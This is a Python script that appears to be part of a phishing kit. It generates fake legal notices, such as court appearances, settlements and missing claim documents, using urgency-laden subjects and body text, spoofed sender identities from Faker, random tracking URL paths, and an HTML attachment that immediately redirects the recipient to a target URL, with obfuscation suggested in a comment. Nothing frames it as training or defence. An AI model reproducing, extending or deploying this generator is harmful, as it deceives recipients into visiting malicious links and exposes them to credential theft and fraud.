
import base64
from faker import Faker
import random
import hashlib
import string
import re

# --- New Dynamic Data Lists for Legal Theme ---
LEGAL_PHRASES = [
    "Official Notification", "Legal Compliance Update", "Regulatory Advisory",
    "Case File Review", "Important Legal Communication", "Action Required",
    "Formal Disclosure", "Compliance Mandate", "Legal Proceeding Update"
]

LEGAL_DOC_TYPES = [
    "Legal Notice", "Compliance Report", "Regulatory Filing", "Court Order",
    "Subpoena", "Discovery Request", "Settlement Agreement", "Arbitration Award",
    "Official Summons", "Statutory Demand"
]

LEGAL_DEPARTMENTS = [
    "Legal Affairs Department", "Compliance Division", "Regulatory Enforcement Unit",
    "Litigation Support Services", "Corporate Counsel Office", "Risk Management Bureau"
]

def generate_legal_phrase():
    return random.choice(LEGAL_PHRASES)

# Initialize Faker to generate fake data
fake = Faker()

def generate_random_md5():
    """Generates a random MD5 hash."""
    return hashlib.md5(str(random.random()).encode()).hexdigest()

def generate_fake_company_data():
    """Generates a dictionary of fake company data."""
    company_name = fake.company()
    return {
        "company_name": company_name,
        "address": fake.address(),
        "phone_number": fake.phone_number(),
    }

def generate_fake_person_data():
    """Generates a dictionary of a fake person's data, including a realistic company email."""
    first_name = fake.first_name()
    last_name = fake.last_name()
    full_name = f"{first_name} {last_name}"
    
    # Create a sanitized company name for the email domain
    company_name = fake.company().replace(" ", "").replace(",", "").lower()
    company_domain = f"{company_name}.com"
    
    email = f"{first_name.lower()}.{last_name.lower()}@{company_domain}"
    
    return {
        "full_name": full_name,
        "email": email,
        "email_with_name": f'"{full_name}" <{email}>'
    }

def generate_random_path(length=125):
    """Generates a random, URL-safe, base64-encoded path string."""
    random_bytes = random.getrandbits(length * 8).to_bytes(length, byteorder='big')
    base64_encoded = base64.b64encode(random_bytes).decode('utf-8')
    safe_path = base64_encoded.replace('+', '-').replace('/', '_').rstrip('=')
    return safe_path

def generate_safe_html_attachment(target_url):
    """Generates a safe HTML attachment for redirecting."""
    # This is a basic implementation. More complex obfuscation can be added if needed.
    return f"""<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url={target_url}"></head><body><p>Redirecting...</p><script>window.location.replace("{target_url}");</script></body></html>"""

# --- Themed email pools: subject + matching sentence-level fragments ---
THEMED_EMAILS = [
    # Theme: Court Appearance / Service
    {
        "subjects": [
            "Remote Appearance In Court - ID2023108375",
            "Court Appearance Reminder #312CASE435-5671",
            "SERVICE OF COURT DOCUMENT CASE NUMBER 482023CA002865",
        ],
        "opens": [
            "You have a scheduled court appearance or service entry on file.",
            "This address is attached to an active court service or appearance notice.",
            "A court filing now requires your attention by the next scheduled date.",
        ],
        "middles": [
            "The docket indicates a pending action that can affect your record if left unaddressed.",
            "If you have counsel or a case number on file, this notice may relate to their latest filing.",
            "Review these details and confirm whether this matter still applies to you.",
        ],
        "closes": [
            "Open the record update to verify the case number, filing date, and any next scheduled action.",
            "Use the secure link to confirm receipt and see what the docket shows next.",
            "Check this document now so you have the correct information before the next hearing deadline.",
        ],
    },
    # Theme: Case Status / Settlement
    {
        "subjects": [
            "Pending Settlement Agreement: -20137985857",
            "E-STATUS -ID293043754 MSG -ATTORNEY",
            "Pre-Settlement Representation Request — Case: 2023L064",
        ],
        "opens": [
            "Your case file has moved into a new status that typically requires a response.",
            "A settlement update is now attached to your file and ready for review.",
            "The pre-settlement review for your case has reached a stage where confirmation may be needed.",
        ],
        "middles": [
            "Review the status to see whether any documentation or confirmation is still outstanding.",
            "If a settlement offer or status change is listed, acting promptly protects your position.",
            "The docket shows movement on your case; confirmation of representation or intent may be required soon.",
        ],
        "closes": [
            "Open the case update to review the current status and any next steps.",
            "Use the link to confirm whether you want to proceed under the current settlement pathway.",
            "Check the case file for attorney representation status and filing deadlines before they shift.",
        ],
    },
    # Theme: Missing Documents / Filings
    {
        "subjects": [
            "Action Required: Missing Document for Claim 74686287",
            "Action Required: Missing Folder for CLAIM#4686287",
            "Confirmation of Claim Submission - 9839757",
        ],
        "opens": [
            "The court or claims office flagged a missing document tied to your matter.",
            "A submission review found a gap in the paperwork for your claim or case file.",
            "Your claim is on record, but one required document or folder is still outstanding.",
        ],
        "middles": [
            "Uploading or confirming the missing item will move your file back into active processing.",
            "Without the missing document, the next review or hearing date could be delayed.",
            "The department’s filing checklist shows one item still needed before this case can advance.",
        ],
        "closes": [
            "Open the notice to see exactly which item is missing and how to submit it.",
            "Use the link to confirm receipt and get submission instructions for the outstanding item.",
            "Review the claim summary now so you know what still needs to be filed.",
        ],
    },
    # Theme: Legal Services / Consultation
    {
        "subjects": [
            "Legal Consultation Appointment Confirmation",
            "Invitation to Attend Legal Seminar",
            "Legal Service Proposal for case 69867372",
        ],
        "opens": [
            "A legal consultation has been scheduled or proposed for your review.",
            "Our office has a service proposal on file that requires your acknowledgment.",
            "You are invited to review a proposed legal service related to your matter.",
        ],
        "middles": [
            "Confirming attendance or intent keeps your file aligned with the department’s schedule.",
            "If you already have representation, forwarding this helps avoid duplicate filings.",
            "The proposal covers representation terms and next steps for the referenced case.",
        ],
        "closes": [
            "Open the proposal to review the service scope, dates, and confirmation instructions.",
            "Use the link to accept, reschedule, or ask questions about the consultation.",
            "Review the service proposal and reply through the contact provided if terms need adjustment.",
        ],
    },
    # Theme: Archives / E-Notice
    {
        "subjects": [
            "LEGAL ARCHIVES DOC ID:034958",
            "LEGAL E-NOTICE ID: 4157538 - NOTICE",
            "eScanner-294-08 Scan Notification",
        ],
        "opens": [
            "A legal archive or e-notice has been generated and is available for your records.",
            "Your document was processed through our scanning or e-notice system.",
            "The archives system shows a newly indexed document under your reference ID.",
        ],
        "middles": [
            "You can view the document reference, timestamp, and filing status through the secure link.",
            "If you need a personal copy, download it before the archive window closes.",
            "This notice confirms receipt and indexing of the document in the department’s archive.",
        ],
        "closes": [
            "Open the archive notice to view the document ID and download options.",
            "Use the link to access the scanned document and confirm it matches your records.",
            "Review the e-notice and retain the reference ID for future correspondence.",
        ],
    },
]

def pick_body_variant(count: int = 3):
    """Return a coherent themed subject + sentence-level body fragments."""
    theme = random.choice(THEMED_EMAILS)
    return {
        "subject_variant": random.choice(theme["subjects"]),
        "body_variant_1": random.choice(theme["opens"]),
        "body_variant_2": random.choice(theme["middles"]),
        "body_variant_3": random.choice(theme["closes"]),
        "closing_variant": random.choice([
            "If this isn't your case, reply Stop and we'll update our records immediately.",
            "If you received this in error, reply Stop and we'll suppress future notices the same day.",
            "If this reached the wrong address, reply Stop and it will be removed from our files.",
            "If this isn't relevant to you, a quick Stop reply is enough to clear the record.",
        ]),
    }
